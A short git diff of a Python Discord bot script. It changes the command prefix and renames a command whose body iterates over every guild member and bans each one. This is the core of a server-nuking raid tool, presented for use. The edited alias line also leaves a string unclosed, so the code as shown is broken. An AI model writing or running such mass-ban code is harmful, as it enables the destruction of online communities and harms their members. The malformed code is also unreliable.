@@ -7,15 +7,15 @@ import jishaku
 
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix = 'PREFIX HERE', intents=intents)
+bot = commands.Bot(command_prefix = 'x', intents=intents)
 
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user.name}({bot.user.id})')
 
-@bot.command(aliases=['king,baap'])
+@bot.command(aliases=['raghav])
 
-async def baap(ctx):
+async def raghav(ctx):
     for member in ctx.guild.members:
         try:
             await member.ban()
